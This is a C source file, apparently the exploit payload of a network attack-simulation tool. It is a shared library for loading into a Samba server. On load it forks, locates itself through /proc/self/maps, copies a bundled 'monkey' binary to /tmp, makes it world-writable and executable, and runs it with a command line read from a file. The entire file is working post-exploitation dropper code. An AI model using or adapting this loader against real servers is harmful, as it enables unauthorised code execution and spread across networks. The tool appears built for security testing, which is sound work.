#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "sc_monkey_runner.h"

#ifdef __x86_64__
	#define ARCH_IS_64
#endif

#ifdef _____LP64_____
	#define ARCH_IS_64
#endif

#define LINE_MAX_LENGTH (2048)
#define MAX_PARAMETERS (30)

int samba_init_module(void)
{
#ifdef ARCH_IS_64
	const char RUNNER_FILENAME[] = "sc_monkey_runner64.so";
	const char MONKEY_NAME[] = "monkey64";
#else
	const char RUNNER_FILENAME[] = "sc_monkey_runner32.so";
	const char MONKEY_NAME[] = "monkey32";
#endif
	const char RUNNER_RESULT_FILENAME[] = "monkey_runner_result";
	const char COMMANDLINE_FILENAME[] = "monkey_commandline.txt";
	const int ACCESS_MODE = 0777;
	const char RUN_MONKEY_CMD[] = "./";
	const char MONKEY_DEST_FOLDER[] = "/tmp";
	const char MONKEY_DEST_NAME[] = "monkey";

	int found = 0;
	char modulePathLine[LINE_MAX_LENGTH] = {'\0'};
	char commandline[LINE_MAX_LENGTH] = {'\0'};
	char* monkeyDirectory = NULL;
	char* fileNamePointer = NULL;
	FILE * pFile = NULL;
	pid_t pid = 0;
	int monkeySize = 0;
	void* monkeyBinary = NULL;
	struct stat fileStats;

	pid = fork();

	if (0 != pid)
	{
		// error or this is parent - nothing to do but return.
		return 0;
	}

	// Find fullpath of running module.
	pFile = fopen("/proc/self/maps", "r");
	if (NULL == pFile)
	{
		return 0;
	}

	while (fgets(modulePathLine, LINE_MAX_LENGTH, pFile) != NULL) {
		fileNamePointer = strstr(modulePathLine, RUNNER_FILENAME);
        if (fileNamePointer != NULL) {
			found = 1;
			break;
        }
	}

	fclose(pFile);

	// We can't find ourselves in module list
	if (0 == found)
	{
		return 0;
	}

	monkeyDirectory = strchr(modulePathLine, '/');
	*fileNamePointer = '\0';

	if (0 != chdir(monkeyDirectory))
	{
		return 0;
	}

	// Write file to indicate we're running
	pFile = fopen(RUNNER_RESULT_FILENAME, "w");
	if (NULL == pFile)
	{
		return 0;
	}

	fwrite(monkeyDirectory, 1, strlen(monkeyDirectory), pFile);
	fclose(pFile);

	// Read commandline
	pFile = fopen(COMMANDLINE_FILENAME, "r");
	if (NULL == pFile)
	{
		return 0;
	}

	// Build commandline
	snprintf(commandline, sizeof(commandline), "%s%s ", RUN_MONKEY_CMD, MONKEY_DEST_NAME);
	
	fread(commandline + strlen(commandline), 1, LINE_MAX_LENGTH, pFile);
	fclose(pFile);
	
	if (0 != stat(MONKEY_NAME, &fileStats))
	{
		return 0;
	}
	
	monkeySize = (int)fileStats.st_size;
	
	// Copy monkey to new file so we'll own it.
	pFile = fopen(MONKEY_NAME, "rb");
	
	if (NULL == pFile)
	{
		return 0;
	}
	
	monkeyBinary = malloc(monkeySize);
	
	if (NULL == monkeyBinary)
	{
		return 0;
	}
	
	fread(monkeyBinary, 1, monkeySize, pFile);
	fclose(pFile);
	
	if (0 != chdir(MONKEY_DEST_FOLDER))
	{
		return 0;
	}
	
	pFile = fopen(MONKEY_DEST_NAME, "wb");
	if (NULL == pFile)
	{
		free(monkeyBinary);
		return 0;
	}
	fwrite(monkeyBinary, 1, monkeySize, pFile);
	fclose(pFile);
	free(monkeyBinary);
	
	// Change monkey permissions
    if (0 != chmod(MONKEY_DEST_NAME, ACCESS_MODE))
    {
        return 0;
    }
	
	system(commandline);
	
	return 0;
}

int init_samba_module(void)
{
	return samba_init_module();
}